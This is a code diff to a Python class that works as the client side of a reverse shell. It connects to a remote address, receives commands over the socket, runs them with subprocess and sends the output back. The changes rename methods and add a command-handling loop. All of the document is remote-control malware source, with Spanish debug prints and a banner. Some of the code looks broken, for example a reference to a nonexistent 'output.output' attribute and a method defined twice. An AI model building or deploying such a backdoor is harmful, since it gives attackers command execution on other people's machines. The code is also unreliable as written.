@@ -15,13 +15,27 @@ class Session():
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connected = True
 
-    def parsecmd(self):
+    def parse_cmd(self):
         self.cmd = (b''.join(self.chunks)).decode('utf-8')
         print(self.cmd)
         INTERNAL = ["exit", "}whoami", "}sessionid"]
         if self.cmd in INTERNAL:
             return True
         return False
+
+    def handle_io(self):
+        try:
+            while True:
+                self.recv_cmd()
+                if self.parse_cmd():
+                    output = self.exec_internal_cmd()
+                else:
+                    output = self.exec_cmd()
+                self.socket.sendall(output.output.encode('utf-8'))
+        except(BlockingIOError):
+            pass
+            
+
 
     def exec_internal_cmd(self):
         print("InternalCMD")
@@ -39,7 +53,7 @@ class Session():
             output.stdout = "\033[31m;t4LoN }>->\033[31m;"
             return output
 
-    def exec_internal_cmd(self):
+    def exec_cmd(self):
         print("comando: ", self.cmd)
         output = subprocess.run(self.cmd, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, stdin=subprocess.PIPE,
@@ -47,7 +61,7 @@ class Session():
         print("salida: ", output)
         return output
 
-    def recvcmd(self):
+    def recv_cmd(self):
         self.chunks = []
         while True:
             self.bytes = self.socket.recv(self.bufs)
@@ -66,12 +80,11 @@ class Session():
         try:
             self.socket.connect(self.address)
             print("connected")
-            self.reverse_shell()
             # self.socket.setblocking(0)
             # while True:
             #     self.chunks = []
             #     try:
-            #         self.recvcmd()
+            #         self.recv_cmd()
             #         INTERNAL = self.parsecmd()
             #         if INTERNAL:
             #             output = self.exec_internal_cmd()
